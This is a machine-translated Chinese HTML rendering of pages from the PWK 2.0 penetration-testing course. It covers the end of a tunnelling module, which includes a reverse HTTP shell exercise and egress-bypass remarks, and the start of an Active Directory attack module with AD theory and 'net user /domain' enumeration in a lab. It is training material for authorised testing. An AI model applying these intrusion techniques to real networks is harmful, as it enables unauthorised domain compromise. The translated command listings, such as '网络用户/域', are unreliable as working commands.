<div style="position:absolute;top:4386;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在前面的模块中介绍）以获得反向 HTTP shell。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">599</font></font></font></nobr></div>
<div style="position:absolute;top:4414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用您的专用客户端复制上面演示的场景。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:4451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.6 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们介绍了端口转发和隧道的概念。</font><font style="vertical-align: inherit;">该模块包含</font></font></nobr></div>
<div style="position:absolute;top:4512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 和 *NIX 操作系统上应用这些技术的工具，这使我们能够</font></font></nobr></div>
<div style="position:absolute;top:4532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过各种出口限制以及深度数据包检测设备。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:4799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">599 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Apurv Singh Gautam，2019 年），https://github.com/apurvsinghgautam/HTTP-Reverse-Shell</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:4927;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4960;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:6037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:6037;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:6037;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">622</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:5050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.6.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:5076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21. 活动目录攻击</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Active Directory 域服务，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">600</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常称为 Active Directory (AD)，是一项服务</font></font></nobr></div>
<div style="position:absolute;top:5140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许系统管理员更新和管理操作系统、应用程序、用户、</font></font></nobr></div>
<div style="position:absolute;top:5159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和大规模的数据访问。</font><font style="vertical-align: inherit;">由于 Active Directory 可能是一个高度复杂和细粒度的</font></font></nobr></div>
<div style="position:absolute;top:5179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理层，它构成了一个非常大的攻击面，值得关注。</font></font></nobr></div>
<div style="position:absolute;top:5211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将介绍 Active Directory 并演示枚举、身份验证、</font></font></nobr></div>
<div style="position:absolute;top:5231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和横向运动技术。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:5268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.1 活动目录理论</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们首先简要概述基本的 Active Directory 概念和术语，以制定</font></font></nobr></div>
<div style="position:absolute;top:5329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们进入枚举和利用之前。</font></font></nobr></div>
<div style="position:absolute;top:5362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 由几个组件组成。</font><font style="vertical-align: inherit;">最重要的组成部分是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域</font></font></i></nobr></div>
<div style="position:absolute;top:5381;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(DC)，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">601</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是带有</font><i><font style="vertical-align: inherit;">Active Directory 域服务</font></i><font style="vertical-align: inherit;">的 Windows 2000-2019 服务器</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:5400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">角色安装。</font><font style="vertical-align: inherit;">域控制器是 Active Directory 的中心和核心，因为它存储所有</font></font></nobr></div>
<div style="position:absolute;top:5420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关如何配置 Active Directory 的特定实例的信息。</font><font style="vertical-align: inherit;">它还强制执行</font></font></nobr></div>
<div style="position:absolute;top:5439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理给定 Windows 域中的对象如何与每个对象交互的各种规则</font></font></nobr></div>
<div style="position:absolute;top:5458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他，以及最终用户可以使用哪些服务和工具。</font><font style="vertical-align: inherit;">Active 的功能和复杂性</font></font></nobr></div>
<div style="position:absolute;top:5478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录建立在网络管理员可用的令人难以置信的控制粒度上。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:5540;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共有三种不同版本的 Windows 服务器操作系统。</font><font style="vertical-align: inherit;">首先</font></font></i></nobr></div>
<div style="position:absolute;top:5559;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是最初的“桌面体验”版本。</font><font style="vertical-align: inherit;">服务器核心，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">602</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">引入</font></font></i></nobr></div>
<div style="position:absolute;top:5579;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2008 R2，是一个最小的服务器安装，没有专用的</font></font></i></nobr></div>
<div style="position:absolute;top:5598;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图形界面。</font><font style="vertical-align: inherit;">Server Nano，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">603</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的最新版本，在</font></font></i></nobr></div>
<div style="position:absolute;top:5617;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2016 甚至比 Server Core 还要小。</font><font style="vertical-align: inherit;">标准</font></font></i></nobr></div>
<div style="position:absolute;top:5636;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“桌面体验”和服务器核心版本可以作为域</font></font></i></nobr></div>
<div style="position:absolute;top:5656;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器。</font><font style="vertical-align: inherit;">Nano版不能。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置 Active Directory 实例后，</font><font style="vertical-align: inherit;">会创建</font><font style="vertical-align: inherit;">一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，其名称如</font></font></nobr></div>
<div style="position:absolute;top:5737;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是组织的名称。</font><font style="vertical-align: inherit;">在这个域中，我们可以添加各种类型</font></font></nobr></div>
<div style="position:absolute;top:5757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象，包括计算机和用户对象。</font></font></nobr></div>
<div style="position:absolute;top:5789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统管理员可以（并且几乎总是这样做）在帮助下组织这些对象</font></font></nobr></div>
<div style="position:absolute;top:5809;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织单位</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(OU)。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">604</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OU 类似于文件系统文件夹，因为它们是容器</font></font></nobr></div>
<div style="position:absolute;top:5828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于存储和分组其他对象。</font><font style="vertical-align: inherit;">计算机对象代表实际的服务器和工作站</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:5893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">600 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:5908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务概览</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:5927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">601 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2014 年），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/library/cc786438 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=ws.10).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:5947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">602 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2008 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/ee391626 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:5967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">603 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/get-started/getting-started-with-nano-server</font></font></font></nobr></div>
<div style="position:absolute;top:5987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">604 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://technet.microsoft.com/en-us/library/cc978003.aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:6115;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6148;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:7225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:7225;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:7225;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">623</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加入域</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（该域的一部分），和用户对象在代表雇员</font></font></nobr></div>
<div style="position:absolute;top:6263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织。</font><font style="vertical-align: inherit;">所有 AD 对象都包含属性，这些属性根据对象的类型而有所不同。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:6282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，用户对象可能包括诸如名字、姓氏、用户名和</font></font></nobr></div>
<div style="position:absolute;top:6302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码。</font></font></nobr></div>
<div style="position:absolute;top:6335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常，内部网络上的客户端计算机连接到域控制器并连接到</font></font></nobr></div>
<div style="position:absolute;top:6354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种其他内部成员服务器，如数据库服务器、文件存储服务器等。</font></font></nobr></div>
<div style="position:absolute;top:6373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，许多组织通过与 Internet 连接的 Web 服务器提供内容，</font></font></nobr></div>
<div style="position:absolute;top:6393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有时也是内部域的成员。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6455;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该注意的是，一些组织将拥有不</font></font></i></nobr></div>
<div style="position:absolute;top:6474;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加入域。</font><font style="vertical-align: inherit;">对于面向 Internet 的机器尤其如此。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 在技术上可能令人生畏，因为它包含许多我们可以使用的概念和功能</font></font></nobr></div>
<div style="position:absolute;top:6556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块未完全涵盖。</font><font style="vertical-align: inherit;">相反，我们将介绍基本的 AD 术语和语言</font></font></nobr></div>
<div style="position:absolute;top:6575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有构建我们的枚举和开发能力所需的额外知识。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6637;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 环境对域有非常重要的依赖性</font></font></i></nobr></div>
<div style="position:absolute;top:6656;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称系统 (DNS) 服务。</font><font style="vertical-align: inherit;">因此，AD 中的典型域控制器将</font></font></i></nobr></div>
<div style="position:absolute;top:6675;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还托管对给定域具有权威性的 DNS 服务器。</font><font style="vertical-align: inherit;">请注意</font></font></i></nobr></div>
<div style="position:absolute;top:6695;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在实验室中，您可能还会发现与 Active Directory 无关的 DNS 服务器</font></font></i></nobr></div>
<div style="position:absolute;top:6714;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并为其他计算机提供查找服务。</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2 活动目录枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常，对 Active Directory 基础结构的攻击始于成功的利用或客户端</font></font></nobr></div>
<div style="position:absolute;top:6837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对域工作站或服务器的侧面攻击，然后是 AD 枚举</font></font></nobr></div>
<div style="position:absolute;top:6857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6919;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些渗透测试从假设的违规开始，其中客户端</font></font></i></nobr></div>
<div style="position:absolute;top:6938;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供对工作站的初始访问。</font><font style="vertical-align: inherit;">这样可以节省时间，加速</font></font></i></nobr></div>
<div style="position:absolute;top:6957;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评估，并允许有更多时间评估内部的其余部分</font></font></i></nobr></div>
<div style="position:absolute;top:6977;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基础架构，包括 Active Directory。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们建立了立足点，我们的目标就是提升我们的特权级别，直到我们获得控制权</font></font></nobr></div>
<div style="position:absolute;top:7058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个或多个域。</font><font style="vertical-align: inherit;">有几种方法可以实现这一点。</font></font></nobr></div>
<div style="position:absolute;top:7091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 AD 中，管理员使用组为成员用户分配权限，这意味着</font></font></nobr></div>
<div style="position:absolute;top:7110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的评估中，我们将针对高价值群体。</font><font style="vertical-align: inherit;">在这种情况下，我们可以妥协一个</font></font></nobr></div>
<div style="position:absolute;top:7130;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Domain Admins</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组的</font><font style="vertical-align: inherit;">成员，</font><font style="vertical-align: inherit;">以完全控制</font><i><font style="vertical-align: inherit;">域中</font></i><font style="vertical-align: inherit;">的每台计算机</font></font></nobr></div>
<div style="position:absolute;top:7149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:7303;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:7336;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:8413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:8413;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:8413;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">624</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得域控制权的另一种方法是成功破坏域控制器，因为</font></font></nobr></div>
<div style="position:absolute;top:7451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它可用于修改所有加入域的计算机或在它们上执行应用程序。</font></font></nobr></div>
<div style="position:absolute;top:7470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，正如我们稍后将看到的，域控制器包含每个</font></font></nobr></div>
<div style="position:absolute;top:7490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单域用户帐户。</font></font></nobr></div>
<div style="position:absolute;top:7523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们学习本模块时，我们将了解各种 AD 枚举和利用</font></font></nobr></div>
<div style="position:absolute;top:7542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术来演示典型的域妥协。</font><font style="vertical-align: inherit;">在实际场景中，我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:7561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前面模块中概述的许多 Windows 枚举和利用技术。</font></font></nobr></div>
<div style="position:absolute;top:7580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，在本模块中，我们将重点介绍专门设计用于枚举和利用</font></font></nobr></div>
<div style="position:absolute;top:7600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AD 用户和组。</font></font></nobr></div>
<div style="position:absolute;top:7633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将假设我们已经获得了对 Windows 10 的访问权限</font></font></nobr></div>
<div style="position:absolute;top:7652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过本课程前面介绍的技术进行工作站。</font><font style="vertical-align: inherit;">我们还将假设我们</font></font></nobr></div>
<div style="position:absolute;top:7672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经入侵了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域用户，该用户也是本地管理员的成员</font></font></nobr></div>
<div style="position:absolute;top:7691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加入域的工作站的组。</font><font style="vertical-align: inherit;">这将使我们能够专注于与 Active Directory 相关的</font></font></nobr></div>
<div style="position:absolute;top:7710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举和开发技术。</font></font></nobr></div>
<div style="position:absolute;top:7743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在这个场景中的第一个目标是枚举域用户并尽可能多地学习</font></font></nobr></div>
<div style="position:absolute;top:7762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于他们寻找高价值目标的组成员身份。</font><font style="vertical-align: inherit;">为此，我们将利用几个</font></font></nobr></div>
<div style="position:absolute;top:7782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具和技术，其中许多可以在没有任何管理访问权限的情况下执行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:7816;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:7816;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传统方法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一种技术，我们将其称为“传统”方法，利用内置的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net.exe </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">605</font></font></font></nobr></div>
<div style="position:absolute;top:7874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font><font style="vertical-align: inherit;">具体来说，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 606</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子命令，它枚举所有本地</font></font></nobr></div>
<div style="position:absolute;top:7893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:7928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec.corp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:7962;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\CLIENT251 的用户帐户</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:7996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:8013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政    </font></font></nobr></div>
<div style="position:absolute;top:8013;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政人员    </font></font></nobr></div>
<div style="position:absolute;top:8013;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认帐户</font></font></nobr></div>
<div style="position:absolute;top:8029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来宾    </font></font></nobr></div>
<div style="position:absolute;top:8029;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生    </font></font></nobr></div>
<div style="position:absolute;top:8029;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WDAG公用事业帐户</font></font></nobr></div>
<div style="position:absolute;top:8046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:8066;left:343"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 661 - 运行 net user 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/domain</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志将枚举整个域中的所有用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec.corp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户/域</font></font></font></b></nobr></div>
<div style="position:absolute;top:8147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该请求将在域 corp.com 的域控制器上进行处理。</font></font></nobr></div>
</span></font>
